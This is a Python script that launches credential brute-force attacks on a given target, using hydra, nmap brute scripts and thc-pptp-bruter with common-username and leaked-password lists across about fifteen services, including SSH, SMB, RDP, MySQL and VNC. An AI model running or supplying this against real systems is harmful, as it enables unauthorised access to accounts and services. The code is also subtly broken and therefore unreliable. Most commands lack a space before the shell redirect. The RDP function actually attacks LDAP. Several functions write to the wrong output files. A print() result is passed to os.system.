#!/usr/bin/python

import sys, os, time
target = str(sys.argv[1])

## Many Payloads Taken from: https://book.hacktricks.xyz/brute-force
## The Preference Used By This Script is Hydra Based Attacks Whenever Possible.
## Please Review That Website for Alternate Methods for Attacking Services

def bforce_ftp():
   cmd500 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 21 -o "hydra_ftp.txt" ftp://' + target + '2>&1 | tee -a hydra.txt'
   os.system(cmd500)

def bforce_http():
   cmd510 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 80 -o "hydra_http.txt" http://' + target + '2>&1 | tee -a hydra.txt'
   os.system(cmd510)

def bforce_https():
   cmd520 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 443 -o "hydra_https.txt" https://' + target + '2>&1 | tee -a hydra.txt'
   os.system(cmd520)
  
def bforce_ssh():
   cmd530 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "hydra_ssh.txt" ssh://' + target + '2>&1 | tee -a hydra.txt'
   os.system(cmd530)  
  
def bforce_smb():
   cmd540 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 139 -o "hydra_smb.txt" smb://' + target + '2>&1 | tee -a hydra.txt'
   os.system(cmd540)  

def bforce_imap():
   cmd550 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 993 -o "hydra_imap.txt" imap://' + target + '2>&1 | tee -a hydra.txt'
   os.system(cmd550)

def bforce_irc():
   cmd560 = 'nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb\=/path/users.txt,passdb\=/path/pass.txt -p 6667' + target + '2>&1 | tee -a hydra.txt'
   os.system(cmd560)

def bforce_ldap():
   cmd570 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 389 -o "hydra_http.txt" ldap://' + target + '2>&1 | tee -a hydra.txt'
   os.system(cmd570)

def bforce_mysql():
   cmd580 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 3306 -o "hydra_imap.txt" mysql://' + target + '2>&1 | tee -a hydra.txt'
   os.system(cmd580)

def bforce_pop():
   cmd590 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 995 -o "hydra_pop.txt" pop3://' + target + '2>&1 | tee -a hydra.txt'
   os.system(cmd590)

def bforce_pptp():
   cmd505a = print("This feature requires the PPTP Brute Force Tool Found Here: https://http.kali.org/pool/main/t/thc-pptp-bruter/")
   cmd505 = 'cat "/usr/share/seclists/Passwords/darkweb2017-top100.txt" | thc-pptp-bruter –u root' + target + '2>&1 | tee -a hydra.txt'
   os.system(cmd505a)
   os.system(cmd505)

def bforce_rdp():
   cmd515 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 389 -o "hydra_http.txt" ldap://' + target + '2>&1 | tee -a hydra.txt'
   os.system(cmd515)

def bforce_redis():
   cmd525 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 6379 -o "hydra_redis.txt" redis://' + target + '2>&1 | tee -a hydra.txt'
   os.system(cmd525)

def bforce_rlogin():
   cmd535 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 513 -o "hydra_rlogin.txt" rlogin://' + target + '2>&1 | tee -a hydra.txt'
   os.system(cmd535)

def bforce_vnc():
   cmd545 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 5900 -o "hydra_vnc.txt" vnc://' + target + '2>&1 | tee -a hydra.txt'
   os.system(cmd545)
